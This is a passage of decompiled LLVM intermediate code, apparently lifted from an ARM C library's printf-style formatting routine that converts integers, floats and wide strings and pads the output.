  %v7_12bd0 = icmp eq i8 %v3_12bcc, 10
  br i1 %v7_12bd0, label %dec_label_pc_12bdc, label %bb135

bb135:                                            ; preds = %dec_label_pc_12bc4
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12bc4
  store i32 %v0_12bec, i32* %r3.global-to-local, align 4
  %v1_12be0 = and i32 %v0_12bec, 32
  %v2_12be0 = icmp eq i32 %v1_12be0, 0
  %.175 = select i1 %v2_12be0, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_12bec = and i32 %v0_12bec, 64
  %v2_12bec = icmp eq i32 %v1_12bec, 0
  br i1 %v2_12bec, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_12bdc
  %.176 = select i1 %v2_12be0, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_12bdc, %bb138
  br i1 %v3_12bf8, label %.thread84, label %dec_label_pc_12c00

.thread84:                                        ; preds = %bb139
  %v5_12bf8 = sub nsw i32 0, %v4_12bcc
  store i32 %v5_12bf8, i32* @r4, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12c00:                               ; preds = %bb139
  br i1 %v7_12ce0, label %bb140, label %dec_label_pc_12c0c

bb140:                                            ; preds = %dec_label_pc_12c00
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12c0c:                               ; preds = %dec_label_pc_12c00
  br i1 %v7_12c2c, label %dec_label_pc_12c1c, label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %.thread84, %bb140, %dec_label_pc_12c0c
  %v0_12c4486 = phi i32 [ %v5_12bf8, %.thread84 ], [ %v4_12bcc, %bb140 ], [ %v4_12bcc, %dec_label_pc_12c0c ]
  br label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12c0c, %dec_label_pc_12c18
  %v0_12c4485 = phi i32 [ %v0_12c4486, %dec_label_pc_12c18 ], [ %v4_12bcc, %dec_label_pc_12c0c ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_12c18 ], [ 6, %dec_label_pc_12c0c ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_12c1c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12c1c, i32* %r3.global-to-local, align 4
  %v1_12c20 = icmp slt i32 %v3_12c1c, 0
  %v7_12c24. = select i1 %v1_12c20, i32 %v7_12c24, i32 32
  store i32 %v7_12c24., i32* @sb, align 4
  br i1 %v7_12c2c, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_12c1c
  store i32 %v2_12b78, i32* @lr, align 4
  %v2_12c34 = load i32, i32* %ip.global-to-local, align 4
  %v5_12c34 = mul i32 %v2_12c34, 4
  %v6_12c34 = add i32 %v5_12c34, %v2_12b78
  store i32 %v6_12c34, i32* %r3.global-to-local, align 4
  %v2_12c38 = add i32 %v6_12c34, -260
  %v3_12c38 = inttoptr i32 %v2_12c38 to i32*
  %v4_12c38 = load i32, i32* %v3_12c38, align 4
  store i32 %v4_12c38, i32* %r3.global-to-local, align 4
  %v2_12c40 = and i32 %v4_12c38, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_12c1c, %.thread16
  %storemerge94 = phi i32 [ %v2_12c40, %.thread16 ], [ 1024, %dec_label_pc_12c1c ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_12c4485, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_12c4c = call i32 @_load_inttype()
  %v0_12c50 = load i32, i32* @r1, align 4
  store i32 %v0_12c50, i32* %r2.global-to-local, align 4
  %v0_12c5c = load i32, i32* @r4, align 4
  store i32 %v0_12c5c, i32* %r3.global-to-local, align 4
  store i32 %v2_12c60, i32* %r0.global-to-local, align 4
  %v0_12c64 = load i32, i32* @r5, align 4
  %v6_12c68 = call i32 @_uintmaxtostr(i8* %v5_12c68, i32 %v0_12c4c, i32 %v0_12c50, i32 %v0_12c5c, i32 %v0_12c64)
  store i32 %v6_12c68, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_12c68, i32* @r6, align 4
  br i1 %v3_12c78, label %bb148, label %dec_label_pc_12c7c

dec_label_pc_12c7c:                               ; preds = %bb145
  %v7_12c68 = inttoptr i32 %v6_12c68 to i8*
  %v3_12c7c = load i8, i8* %v7_12c68, align 1
  %v7_12c80 = icmp eq i8 %v3_12c7c, 45
  %v2_12c88 = or i32 %v0_12bec, 2
  %v2_12c88.stack_var_-316.4 = select i1 %v7_12c80, i32 %v2_12c88, i32 %v0_12bec
  store i32 %v2_12c88.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_12c80, label %.thread18, label %dec_label_pc_12c9c

.thread18:                                        ; preds = %dec_label_pc_12c7c
  %v3_12c8c = add i32 %v6_12c68, 1
  store i32 %v3_12c8c, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c7c
  %v1_12c9c = and i32 %v2_12c88.stack_var_-316.4, 2
  %v2_12c9c = icmp eq i32 %v1_12c9c, 0
  br i1 %v2_12c9c, label %dec_label_pc_12ca8, label %bb146

bb146:                                            ; preds = %dec_label_pc_12c9c
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c9c
  %v1_12ca8 = urem i32 %v2_12c88.stack_var_-316.4, 2
  %v2_12ca8 = icmp eq i32 %v1_12ca8, 0
  br i1 %v2_12ca8, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_12ca8
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_12ca8, %bb147
  %v0_12d04 = phi i32 [ %v6_12c68, %bb145 ], [ %v3_12c8c, %.thread18 ], [ %v6_12c68, %dec_label_pc_12ca8 ], [ %v6_12c68, %bb147 ], [ %v6_12c68, %bb146 ]
  %v0_12cc0 = phi i32 [ %v0_12bec, %bb145 ], [ %v2_12c88, %.thread18 ], [ %v0_12bec, %dec_label_pc_12ca8 ], [ %v0_12bec, %bb147 ], [ %v0_12bec, %bb146 ]
  %v3_12cb0 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12cb0, i32* %r2.global-to-local, align 4
  store i32 %v0_12cc0, i32* %r3.global-to-local, align 4
  %v1_12cb8 = icmp slt i32 %v3_12cb0, 0
  br i1 %v1_12cb8, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_12ce8 = phi i32 [ %v3_12cb0, %bb148 ], [ 1, %bb149 ]
  %v1_12cc0 = and i32 %v0_12cc0, 16
  %v2_12cc0 = icmp eq i32 %v1_12cc0, 0
  store i32 %v2_12e94, i32* %r3.global-to-local, align 4
  %v2_12cc8 = sub i32 %v2_12e94, %v0_12d04
  %v1_12ccc = add i32 %v2_12cc8, 127
  store i32 %v1_12ccc, i32* @r5, align 4
  br i1 %v2_12cc0, label %bb157, label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_12cd4
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_12cd4, %bb151
  br i1 %v7_12ce0, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_12ce8, %v1_12ccc
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_12cec, label %dec_label_pc_12cf4, label %bb157

dec_label_pc_12cf4:                               ; preds = %bb155
  %v1_12cf4 = inttoptr i32 %v0_12d04 to i8*
  %v2_12cf4 = load i8, i8* %v1_12cf4, align 1
  %v3_12cf4 = zext i8 %v2_12cf4 to i32
  store i32 %v3_12cf4, i32* %r3.global-to-local, align 4
  %v7_12cf8 = icmp eq i8 %v2_12cf4, 48
  br i1 %v7_12cf8, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_12cf4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_12cf4
  %v2_12d00 = add i32 %v2_12cc8, 128
  store i32 %v2_12d00, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_12d3c = phi i32 [ %v0_12ce8, %bb155 ], [ %v0_12ce8, %bb150 ], [ 1, %bb156 ], [ %v2_12d00, %.thread25 ], [ %v0_12ce8, %bb154 ]
  %v1_12d04 = inttoptr i32 %v0_12d04 to i8*
  %v2_12d04 = load i8, i8* %v1_12d04, align 1
  %v3_12d04 = zext i8 %v2_12d04 to i32
  store i32 %v3_12d04, i32* %r3.global-to-local, align 4
  %v7_12d08 = icmp eq i8 %v2_12d04, 48
  br i1 %v7_12d08, label %dec_label_pc_12d10, label %dec_label_pc_12d38

dec_label_pc_12d10:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_12d14 = load i32, i32* @r7, align 4
  %v7_12d18 = icmp slt i32 %v0_12d14, 6
  br i1 %v7_12d18, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_12d10
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_12d10, %bb158
  br i1 %v7_12c2c, label %.thread26, label %dec_label_pc_12d2c

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_23ee0.1047 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12d2c:                               ; preds = %bb159
  %v2_12d2c = icmp eq i32 %v5_12d3c, 0
  br i1 %v2_12d2c, label %bb160, label %dec_label_pc_12d38

bb160:                                            ; preds = %dec_label_pc_12d2c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12eac

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12d2c, %bb157
  %v2_12d38 = sub i32 %v5_12d3c, %v1_12ccc
  %tmp199 = icmp ugt i32 %v5_12d3c, %v1_12ccc
  br i1 %tmp199, label %.thread90, label %dec_label_pc_12eac

.thread90:                                        ; preds = %dec_label_pc_12d38
  store i32 %v2_12d38, i32* @r4, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12bbc
  br i1 %tmp196, label %dec_label_pc_12d84, label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %dec_label_pc_12d48
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_12d5c = load i32, i32* @fp, align 4
  store i32 %v0_12d5c, i32* %r0.global-to-local, align 4
  %v2_12d60 = load i32, i32* %v1_12ba4, align 4
  %v5_12d60 = load i32, i32* %v4_12d60, align 4
  store i32 %v5_12d60, i32* %r2.global-to-local, align 4
  store i32 %v2_12d64, i32* %r3.global-to-local, align 4
  %v5_12d68 = sext i32 %v2_12d60 to i64
  %v6_12d68 = bitcast i64 %v5_12d68 to double
  %v7_12d68 = call i32 @_fpmaxtostr(i32 %v0_12d5c, double %v6_12d68, i32 %v5_12d60, i32 %v2_12d64, i32 76232)
  store i32 %v7_12d68, i32* %r0.global-to-local, align 4
  %v1_12d6c = icmp slt i32 %v7_12d68, 0
  br i1 %v1_12d6c, label %dec_label_pc_13018, label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d50
  %v2_12d78 = add i32 %v7_12d68, %stack_var_-336.2
  store i32 %v2_12d78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13004

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12d48
  br i1 %v3_12d88, label %dec_label_pc_12e24, label %dec_label_pc_12d8c

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12d84
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_12d84, label %dec_label_pc_12d9c, label %dec_label_pc_12dec

dec_label_pc_12d9c:                               ; preds = %dec_label_pc_12d8c
  %v2_12d9c = load i32, i32* %v1_12ba4, align 4
  store i32 %v2_12d9c, i32* %r3.global-to-local, align 4
  %v9_12da0 = icmp eq i32 %v2_12d9c, 0
  store i32 %v2_12d9c, i32* %stack_var_-44, align 4
  br i1 %v9_12da0, label %dec_label_pc_12eb4, label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12d9c
  %v3_12dac = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12dac, i32* %r3.global-to-local, align 4
  store i32 %v2_12db0, i32* @r0, align 4
  %v5_12dbc = icmp slt i32 %v3_12dac, -1
  br i1 %v5_12dbc, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_12dac
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_12dac, %bb161
  %storemerge193 = phi i32 [ %v3_12dac, %bb161 ], [ -1, %dec_label_pc_12dac ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_12db0, i32* @r1, align 4
  store i32 %v2_12dc4, i32* %r3.global-to-local, align 4
  %v0_12dc8 = call i32 @__GI_wcsrtombs()
  store i32 %v0_12dc8, i32* %r0.global-to-local, align 4
  %v7_12dcc = icmp eq i32 %v0_12dc8, -1
  store i32 %v0_12dc8, i32* @r5, align 4
  br i1 %v7_12dcc, label %dec_label_pc_13018, label %dec_label_pc_12dd8

dec_label_pc_12dd8:                               ; preds = %bb162
  %v0_12dd8 = load i32, i32* @sl, align 4
  store i32 %v0_12dd8, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_12dd8, i32* @r6, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12dec:                               ; preds = %dec_label_pc_12d8c
  store i32 %v2_12e94, i32* %r8.global-to-local, align 4
  %v2_12df0 = load i32, i32* %v1_12ba4, align 4
  store i32 %v2_12dc4, i32* %r2.global-to-local, align 4
  store i32 %v2_12e94, i32* %r0.global-to-local, align 4
  %v3_12dfc = call i32 @__GI_wcrtomb(i32 %v2_12e94, i32 %v2_12df0, i32 %v2_12dc4)
  store i32 %v3_12dfc, i32* %r0.global-to-local, align 4
  %v7_12e00 = icmp eq i32 %v3_12dfc, -1
  store i32 %v3_12dfc, i32* @r5, align 4
  br i1 %v7_12e00, label %dec_label_pc_13018, label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12dec
  %v0_12e0c = load i32, i32* @sl, align 4
  store i32 %v0_12e0c, i32* @r4, align 4
  store i32 %v2_12e94, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_12e1c = trunc i32 %v0_12e0c to i8
  %v2_12e1c = load i32, i32* %r8.global-to-local, align 4
  %v4_12e1c = add i32 %v2_12e1c, %v3_12dfc
  %v5_12e1c = inttoptr i32 %v4_12e1c to i8*
  store i8 %v1_12e1c, i8* %v5_12e1c, align 1
  %v0_12ecc.pre.pre = load i32, i32* @r5, align 4
  %v1_12ecc.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12d84
  br i1 %v3_12e28, label %dec_label_pc_12e88, label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e24
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_12e34 = load i32, i32* %v1_12ba4, align 4
  br i1 %v7_12e24, label %dec_label_pc_12e34, label %dec_label_pc_12e60

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12e2c
  store i32 %v2_12e34, i32* @r6, align 4
  %v2_12e38 = icmp eq i32 %v2_12e34, 0
  br i1 %v2_12e38, label %dec_label_pc_12eb4, label %dec_label_pc_12e40

dec_label_pc_12e40:                               ; preds = %dec_label_pc_12e34, %dec_label_pc_12e90
  %v0_12e50 = phi i32 [ %v2_12e34, %dec_label_pc_12e34 ], [ %v3_12ea0, %dec_label_pc_12e90 ]
  %v3_12e40 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_12e40, i32* %r3.global-to-local, align 4
  %v5_12e4c = icmp slt i32 %v3_12e40, -1
  br i1 %v5_12e4c, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_12e40
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_12e40, %bb163
  %storemerge194 = phi i32 [ %v3_12e40, %bb163 ], [ -1, %dec_label_pc_12e40 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_12e50, i32* %r0.global-to-local, align 4
  %v1_12e54 = inttoptr i32 %v0_12e50 to i8*
  %v2_12e54 = call i32 @strnlen(i8* %v1_12e54)
  store i32 %v2_12e54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ebc

dec_label_pc_12e60:                               ; preds = %dec_label_pc_12e2c
  store i32 %v2_12e34, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_12e94, i32* @r6, align 4
  store i32 %v2_12e34, i32* %stack_var_-180, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12e88:                               ; preds = %dec_label_pc_12e24
  br i1 %v7_12e88, label %dec_label_pc_12e90, label %dec_label_pc_13018

dec_label_pc_12e90:                               ; preds = %dec_label_pc_12e88
  %v0_12e90 = call i32 @__errno_location()
  store i32 %v0_12e90, i32* %r0.global-to-local, align 4
  %v1_12e98 = inttoptr i32 %v0_12e90 to i32*
  %v2_12e98 = load i32, i32* %v1_12e98, align 4
  store i32 %v2_12e98, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_12ea0 = call i32 @__GI___glibc_strerror_r(i32 %v2_12e98, i32 %v2_12e94, i32 128)
  store i32 %v3_12ea0, i32* %r0.global-to-local, align 4
  store i32 %v3_12ea0, i32* @r6, align 4
  br label %dec_label_pc_12e40

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12d38, %.thread26, %bb160
  %v0_12ecc.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_12ccc, %dec_label_pc_12d38 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12ec8thread-pre-split

dec_label_pc_12eb4:                               ; preds = %dec_label_pc_12e34, %dec_label_pc_12d9c
  store i32 ptrtoint ([7 x i8]* @global_var_23ee8.1050 to i32), i32* @r6, align 4
  br label %dec_label_pc_12ebc

dec_label_pc_12ebc:                               ; preds = %bb164, %dec_label_pc_12eb4
  %storemerge = phi i32 [ 6, %dec_label_pc_12eb4 ], [ %v2_12e54, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12ec8thread-pre-split:               ; preds = %.thread90, %dec_label_pc_12e0c, %dec_label_pc_12e60, %dec_label_pc_12eac
  %v1_12ecc.pre = phi i32 [ 0, %dec_label_pc_12eac ], [ %v1_12ecc.pre.pre, %dec_label_pc_12e0c ], [ 0, %dec_label_pc_12e60 ], [ %v2_12d38, %.thread90 ]
  %v0_12ecc.pre = phi i32 [ %v0_12ecc.pre81, %dec_label_pc_12eac ], [ %v0_12ecc.pre.pre, %dec_label_pc_12e0c ], [ 1, %dec_label_pc_12e60 ], [ %v1_12ccc, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_12cc0, %dec_label_pc_12eac ], [ %v0_12bec, %dec_label_pc_12e0c ], [ %v0_12bec, %dec_label_pc_12e60 ], [ %v0_12cc0, %.thread90 ]
  %v0_12ec8.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12ec8thread-pre-split, %dec_label_pc_12dd8, %dec_label_pc_12ebc
  %v1_12f08 = phi i32 [ %v1_12ecc.pre, %dec_label_pc_12ec8thread-pre-split ], [ %v0_12dd8, %dec_label_pc_12dd8 ], [ 0, %dec_label_pc_12ebc ]
  %v0_12ecc = phi i32 [ %v0_12ecc.pre, %dec_label_pc_12ec8thread-pre-split ], [ %v0_12dc8, %dec_label_pc_12dd8 ], [ %storemerge, %dec_label_pc_12ebc ]
  %v0_12ed4 = phi i32 [ %v0_12ec8.pr, %dec_label_pc_12ec8thread-pre-split ], [ 11, %dec_label_pc_12dd8 ], [ 11, %dec_label_pc_12ebc ]
  %v0_12f10 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_12ec8thread-pre-split ], [ %v0_12bec, %dec_label_pc_12dd8 ], [ %v0_12bec, %dec_label_pc_12ebc ]
  %v7_12ec8 = icmp eq i32 %v0_12ed4, 11
  %v2_12ecc = add i32 %v0_12ecc, %v1_12f08
  br i1 %v7_12ec8, label %dec_label_pc_12ee4, label %bb165

bb165:                                            ; preds = %dec_label_pc_12ec8
  %v7_12edc = icmp sgt i32 %v0_12ed4, 5
  %. = select i1 %v7_12edc, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_12ee0 = add i32 %., %v2_12ecc
  br label %dec_label_pc_12ee4

dec_label_pc_12ee4:                               ; preds = %dec_label_pc_12ec8, %bb165
  %v0_12ef8 = phi i32 [ %v2_12ecc, %dec_label_pc_12ec8 ], [ %v2_12ee0, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_12ee8 = sub i32 %tmp97, %v0_12ef8
  %v3_12ee8 = icmp uge i32 %tmp97, %v0_12ef8
  %v9_12ee8 = icmp eq i32 %tmp97, %v0_12ef8
  %v2_12eec = xor i1 %v3_12ee8, true
  %v3_12eec = or i1 %v9_12ee8, %v2_12eec
  br i1 %v3_12eec, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_12ee4
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_12ee4, %bb166
  %v2_12ef0 = xor i1 %v9_12ee8, true
  %v3_12ef0 = and i1 %v3_12ee8, %v2_12ef0
  br i1 %v3_12ef0, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_12ef8.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_12ee8, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_12f08 = phi i32 [ %v1_12ef8.pre, %._crit_edge ], [ %v2_12ee8, %bb168 ]
  %v2_12ef8 = add i32 %v0_12ef8, %stack_var_-336.2
  %v2_12efc = add i32 %v2_12ef8, %v2_12f08
  store i32 %v2_12efc, i32* %ip.global-to-local, align 4
  store i32 %v0_12f10, i32* %r3.global-to-local, align 4
  %v0_12f04 = load i32, i32* @sb, align 4
  %v7_12f04 = icmp eq i32 %v0_12f04, 48
  br i1 %v7_12f04, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_12f08 = add i32 %v2_12f08, %v1_12f08
  store i32 %v3_12f08, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_12f24 = phi i32 [ %v2_12f08, %bb169 ], [ 0, %bb170 ]
  %v1_12f10 = and i32 %v0_12f10, 8
  store i32 %v1_12f10, i32* @r8, align 4
  %v2_12f10 = icmp eq i32 %v1_12f10, 0
  br i1 %v2_12f10, label %dec_label_pc_12f1c, label %dec_label_pc_12f38

dec_label_pc_12f1c:                               ; preds = %.thread29
  %v0_12f1c = load i32, i32* @fp, align 4
  store i32 %v0_12f1c, i32* %r0.global-to-local, align 4
  store i32 %v0_12f24, i32* %r2.global-to-local, align 4
  %v4_12f28 = call i32 @_charpad(i32 %v0_12f1c, i8 32, i32 %v0_12f24)
  store i32 %v4_12f28, i32* %r0.global-to-local, align 4
  %v1_12f2c = load i32, i32* @sl, align 4
  %v9_12f2c = icmp eq i32 %v4_12f28, %v1_12f2c
  br i1 %v9_12f2c, label %dec_label_pc_12f34, label %dec_label_pc_13018

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12f1c
  %v0_12f34 = load i32, i32* @r8, align 4
  store i32 %v0_12f34, i32* @sl, align 4
  %v0_12f40.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12f38

dec_label_pc_12f38:                               ; preds = %.thread29, %dec_label_pc_12f34
  %v0_12f40 = phi i32 [ %v0_12ed4, %.thread29 ], [ %v0_12f40.pre, %dec_label_pc_12f34 ]
  %v0_12f3c = load i32, i32* @fp, align 4
  %v2_12f40 = add i32 %v0_12f40, ptrtoint (i32* @global_var_23ef0.1052 to i32)
  store i32 %v2_12f40, i32* %r0.global-to-local, align 4
  %v2_12f44 = inttoptr i32 %v2_12f40 to i8*
  %v3_12f44 = call i32 @__GI_fputs_unlocked(i8* %v2_12f44, i32 %v0_12f3c)
  %v0_12f48 = load i32, i32* @fp, align 4
  store i32 %v0_12f48, i32* %r0.global-to-local, align 4
  %v0_12f50 = load i32, i32* @r4, align 4
  store i32 %v0_12f50, i32* %r2.global-to-local, align 4
  %v4_12f54 = call i32 @_charpad(i32 %v0_12f48, i8 48, i32 %v0_12f50)
  store i32 %v4_12f54, i32* %r0.global-to-local, align 4
  %v1_12f58 = load i32, i32* @r4, align 4
  %v9_12f58 = icmp eq i32 %v4_12f54, %v1_12f58
  br i1 %v9_12f58, label %dec_label_pc_12f60, label %dec_label_pc_13018

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12f38
  %v3_12f60 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_12f60, i32* %r3.global-to-local, align 4
  %v2_12f64 = icmp eq i32 %v3_12f60, 0
  br i1 %v2_12f64, label %dec_label_pc_12f74, label %dec_label_pc_12fd4thread-pre-split

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f60
  %v0_12f74 = load i32, i32* @r5, align 4
  %v2_12f74 = icmp eq i32 %v0_12f74, 0
  br i1 %v2_12f74, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_12f74
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_12f74
  %v1_12f7c = load i32, i32* @r6, align 4
  store i32 %v1_12f7c, i32* %r0.global-to-local, align 4
  %v1_12f84 = load i32, i32* @fp, align 4
  store i32 %v1_12f84, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 77708, i32* @lr, align 4
  %v1_12f88 = xor i1 %v2_12f74, true
  call void @__pseudo_cond_branch(i1 %v1_12f88, i32 ptrtoint (i32* @global_var_16774.1043 to i32))
  %v0_12f8c = load i32, i32* %r0.global-to-local, align 4
  %v1_12f8c = load i32, i32* @r5, align 4
  %v9_12f8c = icmp eq i32 %v0_12f8c, %v1_12f8c
  br i1 %v9_12f8c, label %dec_label_pc_12fec, label %dec_label_pc_13018

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12fd4
  %v2_12f98 = icmp ult i32 %v1_12f9c, 128
  %.v1_12f9c = select i1 %v2_12f98, i32 %v1_12f9c, i32 128
  store i32 %.v1_12f9c, i32* @r2, align 4
  %v0_12fa4 = call i32 @__GI_wcsrtombs()
  store i32 %v0_12fa4, i32* @r4, align 4
  %v2_12fa8 = icmp eq i32 %v0_12fa4, 0
  store i32 %v0_12fa4, i32* %r3.global-to-local, align 4
  store i32 %v2_12e94, i32* %r0.global-to-local, align 4
  %v0_12fb8 = load i32, i32* @fp, align 4
  store i32 %v0_12fb8, i32* %r2.global-to-local, align 4
  br i1 %v2_12fa8, label %dec_label_pc_12fc8, label %dec_label_pc_12fc0

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12f98
  %v3_12fc0 = call i32 @__stdio_fwrite(i32 %v2_12e94, i32 %v0_12fa4, i32 %v0_12fb8)
  store i32 %v3_12fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_12fc0, i32* %r3.global-to-local, align 4
  %v1_12fc8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12fc8

dec_label_pc_12fc8:                               ; preds = %dec_label_pc_12f98, %dec_label_pc_12fc0
  %v1_12fc8 = phi i32 [ 0, %dec_label_pc_12f98 ], [ %v1_12fc8.pre, %dec_label_pc_12fc0 ]
  %v0_12fcc = phi i32 [ 0, %dec_label_pc_12f98 ], [ %v3_12fc0, %dec_label_pc_12fc0 ]
  %v9_12fc8 = icmp eq i32 %v0_12fcc, %v1_12fc8
  %v1_12fcc = load i32, i32* @r5, align 4
  %v2_12fcc = sub i32 %v1_12fcc, %v0_12fcc
  store i32 %v2_12fcc, i32* @r5, align 4
  br i1 %v9_12fc8, label %dec_label_pc_12fd4, label %dec_label_pc_13018

dec_label_pc_12fd4thread-pre-split:               ; preds = %dec_label_pc_12f60
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_12fd8.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_12fd4

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fd4thread-pre-split, %dec_label_pc_12fc8
